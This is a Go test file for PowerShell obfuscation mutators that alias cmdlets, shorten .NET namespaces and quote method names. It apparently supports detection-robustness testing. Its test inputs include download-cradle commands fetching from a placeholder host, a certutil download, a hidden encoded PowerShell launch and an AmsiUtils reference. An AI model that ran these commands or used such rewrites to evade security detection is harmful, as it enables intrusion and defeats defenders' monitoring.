package mutate

import (
	"strings"
	"testing"
)

// firstValue returns the mutated string of the first result, failing the test if
// the mutator produced nothing.
func firstValue(t *testing.T, got []Result) string {
	t.Helper()
	if len(got) == 0 {
		t.Fatal("expected a mutation, got none")
	}
	return got[0].Value
}

func TestCmdletAlias(t *testing.T) {
	cases := []struct {
		name  string
		in    string
		want  string // exact expected value of the first result; "" means expect nil
		count int    // expected number of results
	}{
		{
			name:  "download cradle head is aliased",
			in:    `Invoke-Expression (New-Object Net.WebClient).DownloadString('http://x')`,
			want:  `iex (New-Object Net.WebClient).DownloadString('http://x')`,
			count: 1,
		},
		{
			name:  "cmdlet after a pipe is command position",
			in:    `Get-ChildItem C:\ | Where-Object { $_.Length -gt 10 }`,
			want:  `gci C:\ | Where-Object { $_.Length -gt 10 }`,
			count: 2, // Get-ChildItem, then Where-Object
		},
		{
			name:  "cmdlet after a semicolon is command position",
			in:    `$x = 1; Start-Sleep 5`,
			want:  `$x = 1; sleep 5`,
			count: 1,
		},
		{
			name: "cmdlet inside a single-quoted string is data",
			in:   `Write-Output 'Invoke-Expression is a cmdlet'`,
			want: "",
		},
		{
			name: "cmdlet as an argument is not in command position",
			in:   `Get-Command2 -Name Invoke-Expression`,
			want: "",
		},
		{
			name: "no cmdlet at all",
			in:   `certutil.exe -urlcache -split http://x/y`,
			want: "",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := cmdletAlias{}.Apply(tc.in)
			if tc.want == "" {
				if got != nil {
					t.Fatalf("expected nil, got %+v", got)
				}
				return
			}
			if len(got) != tc.count {
				t.Fatalf("expected %d results, got %d: %+v", tc.count, len(got), got)
			}
			if got[0].Value != tc.want {
				t.Errorf("got  %q\nwant %q", got[0].Value, tc.want)
			}
		})
	}
}

// ForEach-Object's alias collides with the foreach keyword, so it is only safe
// to substitute after a pipe. At statement start "foreach" would parse as a loop.
func TestCmdletAliasKeywordCollision(t *testing.T) {
	after := cmdletAlias{}.Apply(`1..3 | ForEach-Object { $_ }`)
	if v := firstValue(t, after); v != `1..3 | foreach { $_ }` {
		t.Errorf("expected the pipe form to be aliased, got %q", v)
	}
	if got := (cmdletAlias{}).Apply(`ForEach-Object { $_ }`); got != nil {
		t.Errorf("ForEach-Object at statement start must not become the foreach keyword: %+v", got)
	}
}

func TestCmdletAliasIsDeterministic(t *testing.T) {
	in := `Get-Content a.txt | Select-Object -First 1 | Where-Object { $_ }`
	first := cmdletAlias{}.Apply(in)
	if len(first) != 3 {
		t.Fatalf("expected 3 results, got %d: %+v", len(first), first)
	}
	for i := 0; i < 10; i++ {
		again := cmdletAlias{}.Apply(in)
		if len(again) != len(first) {
			t.Fatal("result count varies between runs")
		}
		for j := range again {
			if again[j] != first[j] {
				t.Fatalf("result order varies: %+v vs %+v", first, again)
			}
		}
	}
}

func TestNamespaceShorten(t *testing.T) {
	cases := []struct {
		name string
		in   string
		want string // "" means expect nil
	}{
		{
			name: "type literal",
			in:   `[System.Net.WebClient]`,
			want: `[Net.WebClient]`,
		},
		{
			name: "static call on a shortened type",
			in:   `[System.Convert]::FromBase64String($b)`,
			want: `[Convert]::FromBase64String($b)`,
		},
		{
			name: "new-object argument",
			in:   `New-Object System.Convert`,
			want: `New-Object Convert`,
		},
		{
			name: "new-object with an explicit -TypeName",
			in:   `New-Object -TypeName System.Net.WebClient`,
			want: `New-Object -TypeName Net.WebClient`,
		},
		{
			name: "two-segment root",
			in:   `[System.Management.Automation.AmsiUtils]`,
			want: `[Management.Automation.AmsiUtils]`,
		},
		{
			name: "every allowlisted reference in one value",
			in:   `[System.IO.File]::WriteAllBytes($p, [System.Convert]::FromBase64String($b))`,
			want: `[IO.File]::WriteAllBytes($p, [Convert]::FromBase64String($b))`,
		},
		{
			name: "root outside the allowlist is left alone",
			in:   `[System.Data.Foo]::Bar()`,
			want: "",
		},
		{
			name: "type name inside a single-quoted string is data",
			in:   `Write-Output '[System.Net.WebClient]'`,
			want: "",
		},
		{
			name: "already shortened",
			in:   `[Net.WebClient]`,
			want: "",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := namespaceShorten{}.Apply(tc.in)
			if tc.want == "" {
				if got != nil {
					t.Fatalf("expected nil, got %+v", got)
				}
				return
			}
			if len(got) != 1 {
				t.Fatalf("expected 1 result, got %d: %+v", len(got), got)
			}
			if got[0].Value != tc.want {
				t.Errorf("got  %q\nwant %q", got[0].Value, tc.want)
			}
		})
	}
}

func TestMemberNameExpression(t *testing.T) {
	cases := []struct {
		name string
		in   string
		want string // "" means expect nil
	}{
		{
			name: "method call is quoted",
			in:   `(New-Object Net.WebClient).DownloadString('http://x')`,
			want: `(New-Object Net.WebClient).'DownloadString'('http://x')`,
		},
		{
			name: "only the first match is rewritten",
			in:   `$w.DownloadFile($a,$b); $w.Dispose()`,
			want: `$w.'DownloadFile'($a,$b); $w.Dispose()`,
		},
		{
			name: "property access without a call is untouched",
			in:   `$w.Headers`,
			want: "",
		},
		{
			name: "static member via :: is untouched",
			in:   `[Convert]::FromBase64String($b)`,
			want: "",
		},
		{
			name: "already quoted member",
			in:   `$w.'DownloadString'('http://x')`,
			want: "",
		},
		{
			name: "member text inside a single-quoted string is data",
			in:   `Write-Output '$w.DownloadString(1)'`,
			want: "",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := memberNameExpression{}.Apply(tc.in)
			if tc.want == "" {
				if got != nil {
					t.Fatalf("expected nil, got %+v", got)
				}
				return
			}
			if len(got) != 1 {
				t.Fatalf("expected 1 result, got %d: %+v", len(got), got)
			}
			if got[0].Value != tc.want {
				t.Errorf("got  %q\nwant %q", got[0].Value, tc.want)
			}
		})
	}
}

func TestPsrQuoteMask(t *testing.T) {
	cases := []struct {
		in   string
		want string // 'q' where the byte is inside a string, '.' elsewhere
	}{
		{`a 'b' c`, `..qqq..`},
		{`a "b" c`, `..qqq..`},
		{"a `' b", `......`}, // an escaped quote outside a string opens nothing
		{`'it''s'`, `qqqqqqq`},
		{`"a`, `qq`}, // an unterminated string swallows the tail
	}
	for _, tc := range cases {
		mask := psrQuoteMask(tc.in)
		var b strings.Builder
		for _, q := range mask {
			if q {
				b.WriteByte('q')
			} else {
				b.WriteByte('.')
			}
		}
		if got := b.String(); got != tc.want {
			t.Errorf("psrQuoteMask(%q) = %s, want %s", tc.in, got, tc.want)
		}
	}
}

// Every mutator in this file must be registered and must never emit a no-op.
func TestPsResolveMutatorsRegistered(t *testing.T) {
	want := map[string]bool{
		"cmdlet-alias":           false,
		"namespace-shorten":      false,
		"member-name-expression": false,
	}
	for _, m := range Catalog() {
		if _, ok := want[m.Name()]; ok {
			want[m.Name()] = true
		}
	}
	for name, seen := range want {
		if !seen {
			t.Errorf("mutator %q is not registered in the catalog", name)
		}
	}
}

func TestPsResolveNeverEmitsNoOp(t *testing.T) {
	values := []string{
		`Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://x')`,
		`powershell.exe -nop -w hidden -enc SQBFAFgA`,
		`'quoted Invoke-Expression [System.Net.WebClient] .DownloadString('`,
		``,
		`.`,
		`[`,
		`'`,
		`"`,
		"`",
	}
	for _, m := range []Mutator{cmdletAlias{}, namespaceShorten{}, memberNameExpression{}} {
		for _, v := range values {
			for _, r := range m.Apply(v) {
				if r.Value == v {
					t.Errorf("%s emitted a no-op for %q", m.Name(), v)
				}
				if r.Note == "" {
					t.Errorf("%s emitted an empty note for %q", m.Name(), v)
				}
			}
		}
	}
}
